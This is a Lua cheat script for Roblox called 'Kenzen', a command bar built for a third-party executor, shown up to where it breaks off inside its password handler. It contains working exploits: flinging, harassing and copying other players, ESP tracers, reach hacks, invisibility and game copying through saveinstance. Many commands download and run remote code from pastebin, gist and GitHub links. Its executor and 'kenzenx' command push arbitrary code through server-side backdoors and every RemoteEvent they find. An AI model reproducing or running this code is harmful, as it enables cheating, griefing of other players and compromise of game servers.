local RTYGFHSWRGYJJRTG = "Kenzen // V: " .. 2 .. "." .. 0 .. "." .. 1
if printconsole then printconsole(RTYGFHSWRGYJJRTG) else print(RTYGFHSWRGYJJRTG) end
--= Start Up =--
if _G.KenzenLoaded then error("kenzen already running") return end
_G.KenzenLoaded = true
if not game:IsLoaded() then game.Loaded:Wait() end
--= Variables =--
local UserInput = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Player = game.Players.LocalPlayer
local password = "k" ..                                                                                                                  "e" ..                                              "k"
local passed = false
local intweeninfo,outtweeninfo = TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.In),TweenInfo.new(0.4,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
local commands,ezbuttons = {"oldanim",
	"tracer",
	"untracer",
	"headspin",
	"dqqs",
	"fps",
	"f3x",
	"antilog",
	"boombox",
	"hydroxide",
	"iy",
	"dex",
	"fling",
	"invisfling",
	"cleanfling",
	"antifling",
	"serverhop",
	"serverhop2",
	"rejoin",
	"nullware",
	"owlhub",
	"removekorblox",
	"saveinstance",
	"copycat",
	"animgrabber",
	"bang",
	"reach",
	"headsit",
	"sdex",
	"copypos",
	"noclip",
	"clip",
	"fly",
	"unfly",
	"invisible",
	"visible",}, {}
local executor

--= GUI =--
local ScreenGui0 = game:GetObjects("rbxassetid://7614129325")[1]
repeat wait() until ScreenGui0:FindFirstChild("Cmdbar")
local TextBox9 = ScreenGui0:WaitForChild("Cmdbar")
local Frame10 = TextBox9:WaitForChild("Commands")
local ScrollingFrame12 = Frame10:WaitForChild("ScrollingFrame")
local TextLabel14 = Instance.new("TextLabel")
TextLabel14.Visible = false
TextLabel14.Size = UDim2.new(1, 0, 0, 15)
TextLabel14.BackgroundColor = BrickColor.new("Institutional white")
TextLabel14.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel14.BackgroundTransparency = 1
TextLabel14.Font = Enum.Font.Gotham
TextLabel14.FontSize = Enum.FontSize.Size14
TextLabel14.TextColor = BrickColor.new("Royal purple")
TextLabel14.TextColor3 = Color3.new(0.498039, 0, 0.85098)
TextLabel14.TextScaled = true
TextLabel14.TextSize = 14
TextLabel14.TextWrap = true
TextLabel14.TextWrapped = true

--= Functions =--
local function check4property(obj, prop)
	return ({pcall(function()if(typeof(obj[prop])=="Instance")then error()end end)})[1]
end
local function Tween(Obj, Time, Settings)	
	game:GetService("TweenService"):Create(Obj, TweenInfo.new(Time), Settings):Play()
end
local function dragify(Frame)
	local frametomove = Frame
	local dragToggle,dragInput,dragStart,startPos
	local dragSpeed = 0
	local function updateInput(input)
		local Delta = input.Position - dragStart
		frametomove.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	end
	Frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UserInput:GetFocusedTextBox() == nil then
			dragToggle = true
			dragStart = input.Position
			startPos = frametomove.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)	
		end
	end)
	Frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	UserInput.InputChanged:Connect(function(input)
		if input == dragInput and dragToggle then
			updateInput(input)
		end
	end)
end
local function loadexecutor()
	executor = game:GetObjects("rbxassetid://7614228507")[1]
	executor.Parent = ScreenGui0
	local HideButton = executor:WaitForChild("Hide")
	local ScriptBox = executor:WaitForChild("TextFrame"):WaitForChild("ScriptBox")
	local ModeButton = executor:WaitForChild("Side")
	local ExecuteButton = executor:WaitForChild("Execute")
	
	local Mode = "Serverside"
	local CodeHidden = false
	--local clientexecute = require(game.JointsService["⚡"]["💾"])
	HideButton.MouseButton1Click:Connect(function()
		if CodeHidden == false then
			HideButton.Text = "ShowText"
			Tween(ScriptBox, 1, {TextTransparency = 1})
			CodeHidden = true
		elseif CodeHidden == true then
			HideButton.Text = "HideText"
			Tween(ScriptBox, 1, {TextTransparency = 0})
			CodeHidden = false
		end
	end)

	ExecuteButton.MouseButton1Click:Connect(function()
		if Mode == "Serverside" then
			game.JointsService:WaitForChild("⚡"):FireServer(ScriptBox.Text,"😎",true)
		elseif Mode == "Clientside" then
			--loadstring(TextBox8.Text)
		end
		wait(0.1)
		executor.Visible = false
	end)

	ModeButton.MouseButton1Click:Connect(function()
		if Mode == "Serverside" then
			Mode = "Clientside"
		else
			Mode = "Serverside"
		end
		ModeButton.Text = Mode
	end)
	dragify(executor,false)
end
local function tweencommands(bool)
	if bool then
		local tween = TweenService:Create(Frame10, intweeninfo, {Position = UDim2.new(-1,0,-0.1,0)})
		tween:Play()
	else
		local tween = TweenService:Create(Frame10, outtweeninfo, {Position = UDim2.new(0,0,-0.1,0)})
		tween:Play()
	end
end

local function toClipboard(String)
	local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
	if clipBoard then
		clipBoard(String)
	end
end

local function saveins(bool)
	saveinstance({noscripts=bool,mode="optimized"})
	local market = game:GetService("MarketplaceService")
	local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
	local e,f = string.gsub(info, "'", "_")
	e,f = string.gsub(e, "%$", "_")
	e,f = string.gsub(e, "!", "_")
	e,f = string.gsub(e, "@", "_")
	e,f = string.gsub(e, "#", "_")
	e,f = string.gsub(e, "%^", "_")
	e,f = string.gsub(e, "&", "_")
	e,f = string.gsub(e, "%%", "_")
	e,f = string.gsub(e, "%*", "_")
	e,f = string.gsub(e, "%(", "_")
	e,f = string.gsub(e, "%)", "_")
	e,f = string.gsub(e, "%.", "_")
	e,f = string.gsub(e, "%[", "_")
	e,f = string.gsub(e, "%]", "_")
	e,f = string.gsub(e, "%+", "_")
	e,f = string.gsub(e, "%-", "_")
	e,f = string.gsub(e, "%?", "_")
	info = e
	local b
	repeat 
		pcall(function()
			b = readfile(info .. ".rbxl")
		end)
		wait()
	until b
	local h
	pcall(function()
		h = isfolder("KenzenDecompile")	
	end)
	if h ~= true then
		makefolder("KenzenDecompile")
	end
	local danameXD = "KenzenDecompile/" .. info .. "-" .. game.PlaceId
	if bool ~= true then
		danameXD = danameXD .. "+" .. "scripts"
	end
	writefile(danameXD .. ".rbxl",b)
	delfile(info .. ".rbxl")
end

local Lines,antifling,Clip,Noclipping,FLYING,invisRunning

local function noclip()
	Clip = false
	local function NoclipLoop()
		if Clip == false and Player.Character ~= nil then
			for _, child in pairs(Player.Character:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true then
					child.CanCollide = false
				end
			end
		end
	end
	Noclipping = RunService.Stepped:connect(NoclipLoop)
end

local function sFLY(vfly)
	FLYING = false
	local speedofthefly = 1
	local speedofthevfly = 1
	while not Player or not Player.Character or not Player.Character:FindFirstChild('HumanoidRootPart') or not Player.Character:FindFirstChild('Humanoid') do
		wait()
	end 
	local T = Player.Character.HumanoidRootPart
	local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local SPEED = 0
	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
			while FLYING do
				if not vfly then
					Player.Character:FindFirstChild("Humanoid").PlatformStand = true
				end
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0, 0)
				end
				BG.cframe = workspace.CurrentCamera.CoordinateFrame
				wait()
			end
			CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			SPEED = 0
			BG:destroy()
			BV:destroy()
			Player.Character.Humanoid.PlatformStand = false
		end)
	end
	Player:GetMouse().KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			if vfly then
				CONTROL.F = speedofthevfly
			else
				CONTROL.F = speedofthefly
			end
		elseif KEY:lower() == 's' then
			if vfly then
				CONTROL.B = - speedofthevfly
			else
				CONTROL.B = - speedofthefly
			end
		elseif KEY:lower() == 'a' then
			if vfly then
				CONTROL.L = - speedofthevfly
			else
				CONTROL.L = - speedofthefly
			end
		elseif KEY:lower() == 'd' then
			if vfly then
				CONTROL.R = speedofthevfly
			else
				CONTROL.R = speedofthefly
			end
		elseif KEY:lower() == 'y' then
			if vfly then
				CONTROL.Q = speedofthevfly*2
			else
				CONTROL.Q = speedofthefly*2
			end
		elseif KEY:lower() == 't' then
			if vfly then
				CONTROL.E = -speedofthevfly*2
			else
				CONTROL.E = -speedofthefly*2
			end
		end
	end)
	Player:GetMouse().KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		elseif KEY:lower() == 'y' then
			CONTROL.Q = 0
		elseif KEY:lower() == 't' then
			CONTROL.E = 0
		end
	end)
	FLY()
end

local function waitForChild(parent, childName)
	local child = parent:findFirstChild(childName)
	if child then return child end
	while true do
		child = parent.ChildAdded:wait()
		if child.Name==childName then return child end
	end
end

local function command(cmd)
	local returnvaluee = TextBox9.Text
	TextBox9.Text = ""
	local cmd2 = cmd:split(" ")
	if string.lower(cmd2[1]) == "fps" then
		loadstring(game:HttpGet('https://gist.githubusercontent.com/CenteredSniper/b84117b57dd254912c4ae6f93cff5fba/raw/cfa3a426366d767c1729c1a92411eeb22d1eca5e/gistfile1.txt'))();
	elseif string.lower(cmd2[1]) == "hydroxide" then
		local function webImport(file)
			return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format("Upbolt", "revision", file)), file .. '.lua')()
		end
		webImport("init")
		webImport("ui/main")
	elseif string.lower(cmd2[1]) == "tracer" then
		if Lines == nil then Lines = {} end
		_G.UpdateTracer = game["Run Service"].RenderStepped:Connect(function()
				for i,v in pairs(Lines) do
					v:Remove()
				end
				Lines = {}
				for i,v in pairs(game.Players:GetPlayers()) do 
					if v ~= Player then
						if v and v.Character ~= nil then
							local Head = v.Character:FindFirstChild("HumanoidRootPart")
							if Head ~= nil then
								local PosChar, withinScreenBounds = workspace.Camera:WorldToViewportPoint(Head.Position)
								if withinScreenBounds then
									local Line = Drawing.new("Line")
									Line.Visible = true
									--Line.From = Vector2.new(workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y)
									--Line.From = Vector2.new(Player:GetMouse().X,Player:GetMouse().Y)
									local a = workspace.Camera:WorldToViewportPoint(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
									Line.From = Vector2.new(a.X,a.Y)
									Line.To = Vector2.new(PosChar.X, PosChar.Y)
									Line.Color = Color3.new(255,255,255)
									Line.Thickness = 2
									Line.Transparency = 1
									Lines[#Lines+1] = Line
								end
							end
						end
					end
				end
			end)
	elseif string.lower(cmd2[1]) == "unfling" then
		for i,player in pairs(Player.Character:GetChildren()) do
			if player.ClassName == "Part" then
				player.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
			end
		end
		if Noclipping then
			Noclipping:Disconnect()
		end
		Clip = true
		Player.Character.HumanoidRootPart.BodyThrust:Destroy()
		Player.Character.Humanoid.PlatformStand = true
		Player.Character.Humanoid.Sit = true
		local temp = Player.Character:FindFirstChildOfClass("Part")
		temp.Anchored = true
		wait(0.2)
		Player.Character.Humanoid.Jump = true
		FLYING = false
		temp.Anchored = false
	elseif string.lower(cmd2[1]) == "fling" then
		noclip()
		sFLY()
		workspace.CurrentCamera.CameraSubject = Player.Character.HumanoidRootPart
		local BT = Instance.new("BodyThrust")
		BT.Parent = Player.Character.HumanoidRootPart
		BT.Force = Vector3.new(999999, 999999, 999999)
		BT.Location = Player.Character.HumanoidRootPart.Position
		for i,player in pairs(Player.Character:GetChildren()) do
			if player.ClassName == "Part" then
				player.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
			end
		end
	elseif string.lower(cmd2[1]) == "fly" then
		sFLY()
	elseif string.lower(cmd2[1]) == "unfly" then
		FLYING = false
	elseif string.lower(cmd2[1]) == "clientrespawn" then
		if Noclipping then
			Noclipping:Disconnect()
		end
		local char = Player.Character
		if char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
		char:ClearAllChildren()
		local newChar = Instance.new("Model")
		newChar.Parent = workspace
		Player.Character = newChar
		wait()
		Player.Character = char
		newChar:Destroy()
	elseif string.lower(cmd2[1]) == "invisfling" then
		local ch = Player.Character
		local prt=Instance.new("Model", Player.Character)
		local z1 = Instance.new("Part")
		z1.Name="Torso"
		z1.CanCollide = false
		z1.Anchored = true
		local z2 = Instance.new("Part", prt)
		z2.Name="Head"
		z2.Anchored = true
		z2.CanCollide = false
		local z3 =Instance.new("Humanoid", prt)
		z3.Name="Humanoid"
		z1.Position = Vector3.new(0,9999,0)
		Player.Character=prt
		wait(3)
		Player.Character=ch
		wait(3)
		local plr = Player
		local cmdm = plr:GetMouse()
		local Hum = Instance.new("Humanoid")
		z2:Clone()
		Hum.Parent = Player.Character
		local root =  Player.Character.HumanoidRootPart
		for i,v in pairs(plr.Character:GetChildren()) do
			if v ~= root and  v.Name ~= "Humanoid" then
				v:Destroy()
			end
		end
		root.Transparency = 0
		root.Material = "ForceField"
		root.Color = Color3.new(1, 1, 1)
		RunService.Stepped:connect(function()
			Player.Character.HumanoidRootPart.CanCollide = false
		end)
		RunService.RenderStepped:connect(function()
			Player.Character.HumanoidRootPart.CanCollide = false
		end)
		sFLY()
		workspace.CurrentCamera.CameraSubject = root
		local bambam = Instance.new("BodyThrust")
		bambam.Parent = Player.Character.HumanoidRootPart
		bambam.Force = Vector3.new(999990,0,999990)
		bambam.Location = Player.Character.HumanoidRootPart.Position
	elseif string.lower(cmd2[1]) == "cleanfling" then
		local tool = Player.Character:FindFirstChildOfClass("Tool")
		if tool then
			tool.Parent = Player.Backpack
			tool.Handle.Massless = true
			local RestoreCFling = {
				Anim = Player.Character.Animate.toolnone.ToolNoneAnim.AnimationId;
				Grip = tool.GripPos;
			}
			tool.GripPos = Vector3.new(5000, 5000, 5000)
			Player.Character.HumanoidRootPart.CustomPhysicalProperties = PhysicalProperties.new(math.huge,math.huge,math.huge,math.huge,math.huge)
			tool.Parent = Player.Character
			pcall(function() Player.Character.Animate.toolnone.ToolNoneAnim.AnimationId = "nil" end)
			wait(.1)
			tool.Parent = Player.Backpack
			wait(.1)
			tool.Parent = Player.Character
			noclip()
		end
	elseif string.lower(cmd2[1]) == "noclip" then
		noclip()
	elseif string.lower(cmd2[1]) == "invisible" then
		if invisRunning then return end
		invisRunning = true
		-- Full credit to AmokahFox @V3rmillion
		repeat wait(.1) until Player.Character
		local Character = Player.Character
		Character.Archivable = true
		local IsInvis = false
		local IsRunning = true
		local InvisibleCharacter = Character:Clone()
		InvisibleCharacter.Parent = game:GetService'Lighting'
		local Void = workspace.FallenPartsDestroyHeight
		InvisibleCharacter.Name = ""
		local CF

		local invisFix = game:GetService("RunService").Stepped:Connect(function()
			pcall(function()
				local IsInteger
				if tostring(Void):find'-' then
					IsInteger = true
				else
					IsInteger = false
				end
				local Pos = Player.Character.HumanoidRootPart.Position
				local Pos_String = tostring(Pos)
				local Pos_Seperate = Pos_String:split(', ')
				local X = tonumber(Pos_Seperate[1])
				local Y = tonumber(Pos_Seperate[2])
				local Z = tonumber(Pos_Seperate[3])
				if IsInteger == true then
					if Y <= Void then
						Respawn()
					end
				elseif IsInteger == false then
					if Y >= Void then
						Respawn()
					end
				end
			end)
		end)

		for i,v in pairs(InvisibleCharacter:GetDescendants())do
			if check4property(v,"Transparency") and check4property(v,"Material") and check4property(v,"Color") then
				if v.Name == "Head" then
					v.Mesh.MeshType = Enum.MeshType.FileMesh
					v.Mesh.MeshId = "rbxassetid://5254294554"
					v.Mesh.Scale = Vector3.new(1,1,1)
				end
				v.Material = Enum.Material.ForceField
				v.Color = Color3.fromRGB(121, 121, 121)
			end
		end

		function Respawn()
			IsRunning = false
			if IsInvis == true then
				pcall(function()
					Player.Character = Character
					wait()
					Character.Parent = workspace
					Character:FindFirstChildWhichIsA'Humanoid':Destroy()
					IsInvis = false
					InvisibleCharacter.Parent = nil
					invisRunning = false
				end)
			elseif IsInvis == false then
				pcall(function()
					Player.Character = Character
					wait()
					Character.Parent = workspace
					Character:FindFirstChildWhichIsA'Humanoid':Destroy()
					TurnVisible()
				end)
			end
		end

		local invisDied
		invisDied = InvisibleCharacter:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
			Respawn()
			invisDied:Disconnect()
		end)

		if IsInvis == true then return end
		IsInvis = true
		CF = workspace.CurrentCamera.CFrame
		local CF_1 = Player.Character.HumanoidRootPart.CFrame
		Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
		workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
		wait(.2)
		workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
		InvisibleCharacter = InvisibleCharacter
		Character.Parent = game:GetService'Lighting'
		InvisibleCharacter.Parent = workspace
		InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
		Player.Character = InvisibleCharacter
		workspace.CurrentCamera:remove()
		wait(.1)
		repeat wait() until Player.Character ~= nil
		workspace.CurrentCamera.CameraSubject = Player.Character:FindFirstChildWhichIsA('Humanoid')
		workspace.CurrentCamera.CameraType = "Custom"
		Player.CameraMinZoomDistance = 0.5
		Player.CameraMaxZoomDistance = 400
		Player.CameraMode = "Classic"
		Player.Character.Head.Anchored = false
		Player.Character.Animate.Disabled = true
		Player.Character.Animate.Disabled = false

		function TurnVisible()
			if IsInvis == false then return end
			invisFix:Disconnect()
			invisDied:Disconnect()
			CF = workspace.CurrentCamera.CFrame
			Character = Character
			local CF_1 = Player.Character.HumanoidRootPart.CFrame
			Character.HumanoidRootPart.CFrame = CF_1
			InvisibleCharacter:Destroy()
			Player.Character = Character
			Character.Parent = workspace
			IsInvis = false
			Player.Character.Animate.Disabled = true
			Player.Character.Animate.Disabled = false
			invisDied = Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
				Respawn()
				invisDied:Disconnect()
			end)
			invisRunning = false
		end
	elseif string.lower(cmd2[1]) == "visible" then
		TurnVisible()
	elseif string.lower(cmd2[1]) == "clip" then
		if Noclipping then
			Noclipping:Disconnect()
		end
	elseif string.lower(cmd2[1]) == "antifling" then
		if antifling == nil then 
			antifling = true
		else
			antifling = not antifling
		end
		local function Collisionless(person)
			if antifling and person.Character then
				for _,child in pairs(person.Character:GetDescendants()) do
					if child:IsA("BasePart") and child.CanCollide then
						child.CanCollide = false
					end
				end
			end
		end
		for _,v in pairs(game.Players:GetPlayers()) do
			if v ~= Player then
				local antifling = RunService.Stepped:connect(function()
					Collisionless(v)
				end)
			end
		end
		game.Players.PlayerAdded:Connect(function(v)
			if v ~= Player and antifling then
				local antifling = RunService.Stepped:connect(function()
					Collisionless(v)
				end)
			end
		end)
	elseif string.lower(cmd2[1]) == "f3x" then
		loadstring(game:GetObjects("rbxassetid://4698064966")[1].Source)()
	elseif string.lower(cmd2[1]) == "sdex" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/others/sdex", true))()
	elseif string.lower(cmd2[1]) == "untracer" then
		if _G.UpdateTracer then _G.UpdateTracer:Disconnect() end
		for i,v in pairs(Lines) do
			v:Remove()
		end
		Lines = {}
	elseif string.lower(cmd2[1]) == "oldanim" then
		loadstring(game:HttpGet("https://pastebin.com/raw/i7DMMJy3", true))()
	elseif string.lower(cmd2[1]) == "headspin" then
		game["Players"].LocalPlayer.Character.Humanoid.Health = 0
		game["Players"].LocalPlayer.CharacterAdded:Connect(function(char)

			Player.Character:WaitForChild("Animate").Disabled = true
			Player.Character:WaitForChild('Humanoid'):WaitForChild("Animator"):Destroy()
			waitForChild(Player.Character.Torso, "Neck").DesiredAngle = math.huge


		end)
	elseif string.lower(cmd2[1]) == "copypos" then
		local roundedPos = math.round(Player.Character.HumanoidRootPart.Position.X) .. ", " .. math.round(Player.Character.HumanoidRootPart.Position.Y) .. ", " .. math.round(Player.Character.HumanoidRootPart.Position.Z)
		toClipboard(roundedPos)
	elseif string.lower(cmd2[1]) == "dqqs" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CenteredSniper/Kenzen/master/QuickSwitch.lua"))()
	elseif string.lower(cmd2[1]) == "antilog" then
		loadstring(game:HttpGet('https://pastebin.com/raw/444k40vk'))();
	elseif string.lower(cmd2[1]) == "saveinstance" then
		local bool = false
		if cmd2[2] then if string.lower(cmd2[2]) == "yes" or string.lower(cmd2[2]) == "true" then bool = true end end
		saveins(bool)
	elseif string.lower(cmd2[1]) == "removekorblox" then
		local LP = Player
		local a = LP.Character:FindFirstChild("Korblox Deathspeaker Right Leg")
		if a then a:Destroy() end
		LP.CharacterAdded:Connect(function(v)
			repeat wait() until v:FindFirstChild("Korblox Deathspeaker Right Leg")
			v:WaitForChild("Korblox Deathspeaker Right Leg"):Destroy()
		end)
	elseif string.lower(cmd2[1]) == "copycat" then
		if _G.FunyEpic then _G.FunyEpic:Disconnect() end
		if cmd2[2] then
			local copyplr
			for _, v in pairs(game.Players:GetPlayers()) do
				if cmd2[2]:lower() == (v.Name:lower()):sub(1, #cmd2[2]) then
					copyplr = v
				end
			end
			if copyplr then
				_G.FunyEpic = game:GetService("RunService").Heartbeat:Connect(function()
					local pos = copyplr.Character.HumanoidRootPart.CFrame
					wait(tonumber(cmd2[3]) or 0)
					Player.Character.HumanoidRootPart.CFrame = pos
				end)
			end
		end
	elseif string.lower(cmd2[1]) == "kenzenx" then
		local c = game:GetService("CoreGui"):FindFirstChild("DevConsoleMaster")
		if c then
			local cb = game:GetService("CoreGui").DevConsoleMaster:FindFirstChild("cb",true)
			if cb then
				game:GetService("CoreGui").DevConsoleMaster.DevConsoleWindow.DevConsoleUI.MainView.ServerLog.CommandLine.InputField.TextBox:CaptureFocus()
				game:GetService("CoreGui").DevConsoleMaster.DevConsoleWindow.DevConsoleUI.MainView.ServerLog.CommandLine.InputField.TextBox.Text = "require(6655750685).KenzenX()"
				game:GetService("CoreGui").DevConsoleMaster.DevConsoleWindow.DevConsoleUI.MainView.ServerLog.CommandLine.InputField.TextBox:ReleaseFocus(true)
			end
		end
		wait(1)
		local a = Player.PlayerGui:FindFirstChild("PlayerList",true)
		if a then
			if a.Parent:FindFirstChild("TopBar") then
				a.Parent.TextBox:CaptureFocus()
				a.Parent.TextBox.Text = ":s require(6655750685).KenzenX()"
				a.Parent.TextBox:ReleaseFocus(true)
			end
		end
		wait(1)
		local b = Player:FindFirstChild("Loadstring",true)
		if b then
			for i,v in pairs(b.Parent.Parent:GetDescendants()) do
				if v:IsA("RemoteEvent") then
					v:FireServer("require(6655750685).KenzenX()")
				end
			end
		end
	elseif string.lower(cmd2[1]) == "headsit" then
		if _G.FunyEpic then _G.FunyEpic:Disconnect() end
		if cmd2[2] then
			local copyplr
			for _, v in pairs(game.Players:GetPlayers()) do
				if cmd2[2]:lower() == (v.Name:lower()):sub(1, #cmd2[2]) then
					copyplr = v
				end
			end
			if copyplr then
				Player.Character:FindFirstChildOfClass('Humanoid').Sit = true
				_G.FunyEpic = game:GetService("RunService").Heartbeat:Connect(function()
					if Player.Character:FindFirstChildOfClass('Humanoid').Sit == true then
						Player.Character.HumanoidRootPart.CFrame = copyplr.Character.HumanoidRootPart.CFrame *CFrame.new(0,1.6,1.15)
					else
						if _G.FunyEpic then _G.FunyEpic:Disconnect() end
					end
				end)
			end
		end
	elseif string.lower(cmd2[1]) == "reach" then
		for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
			if v:IsA("Tool") then
				if cmd2[2] then
					local tonum = tonumber(cmd[2])
					currentToolSize = v.Handle.Size
					currentGripPos = v.GripPos
					local a = Instance.new("SelectionBox")
					a.Name = "SelectionBoxCreated"
					a.Parent = v.Handle
					a.Adornee = v.Handle
					v.Handle.Massless = true
					v.Handle.Size = Vector3.new(tonum,tonum,tonum)
					v.GripPos = Vector3.new(0,0,0)
					game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
				else
					currentToolSize = v.Handle.Size
					currentGripPos = v.GripPos
					local a = Instance.new("SelectionBox")
					a.Name = "SelectionBoxCreated"
					a.Parent = v.Handle
					a.Adornee = v.Handle
					v.Handle.Massless = true
					v.Handle.Size = Vector3.new(50,50,50)
					v.GripPos = Vector3.new(0,0,0)
					game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
				end
			end
		end
	elseif string.lower(cmd2[1]) == "bang" then
		if _G.FunyEpic then _G.FunyEpic:Disconnect() end
		if cmd2[2] then
			local copyplr
			for _, v in pairs(game.Players:GetPlayers()) do
				if cmd2[2]:lower() == (v.Name:lower()):sub(1, #cmd2[2]) then
					copyplr = v
				end
			end
			if copyplr then
				local bangAnim = Instance.new("Animation")
				if game:GetService("Players").LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
					bangAnim.AnimationId = "rbxassetid://5918726674"
				else
					bangAnim.AnimationId = "rbxassetid://148840371"
				end
				bang = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(bangAnim)
				bang:Play(.1, 1, 1)
				bang:AdjustSpeed(5)
				bangDied = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
					_G.FunyEpic:Disconnect()
					bang:Stop()
					bangAnim:Destroy()
					bangDied:Disconnect()
				end)
				_G.FunyEpic = game:GetService("RunService").Heartbeat:Connect(function()
					Player.Character.HumanoidRootPart.CFrame = copyplr.Character.HumanoidRootPart.CFrame *CFrame.new(0,0,1)
				end)
			end
		end
	elseif string.lower(cmd2[1]) == "owlhub" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ZinityDrops/OwlHubLink/master/OwlHubBack.lua"))();
	elseif string.lower(cmd2[1]) == "animgrabber" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CenteredSniper/Kenzen/master/AnimationStealer.lua"))()
	elseif string.lower(cmd2[1]) == "boombox" then
		loadstring(game:HttpGetAsync('https://riptxde.dev/u/hub/script.lua'))()
	elseif string.lower(cmd2[1]) == "iy" then
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	elseif string.lower(cmd2[1]) == "dex" then
		loadstring(game:HttpGetAsync("https://pastebin.com/raw/fPP8bZ8Z"))()
	elseif string.lower(cmd2[1]) == "nullware" then 
		loadstring(game:HttpGetAsync("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/dabc2500988785fbec1ce7c7aaee105d/raw/hVQJXfF4sR6yqSfJ"))()
	elseif string.lower(cmd2[1]) == "serverhop" then
		local sl = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/".. game.PlaceId.. "/servers/Public?sortOrder=Asc&limit=100"))
		for i,v in pairs(sl.data) do
			if v.playing < v.maxPlayers and v.id ~= game.JobId then
				game:service'TeleportService':TeleportToPlaceInstance(game.PlaceId, v.id)
			end
		end
	elseif string.lower(cmd2[1]) == "serverhop2" then
		game:GetService('TeleportService'):Teleport(game.PlaceId, Player)
	elseif string.lower(cmd2[1]) == "rejoin" then
		if #game.Players:GetPlayers() <= 1 then
			wait()
			game:GetService('TeleportService'):Teleport(game.PlaceId, Player)
		else
			game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, Player)
		end
	else return returnvaluee
	end
end

--= UserInput =--
TextBox9.FocusLost:connect(function(enterPressed)
	if enterPressed then
		if passed == false then
			if TextBox9.Text == password then
				if writefile then
					if pcall(function() readfile("password.KX") end) then
						-- nothing, wtf?
					else
						warn(TextBox9.Text)
						writefile("password.KX",TextBox9.Text)
					end
				end
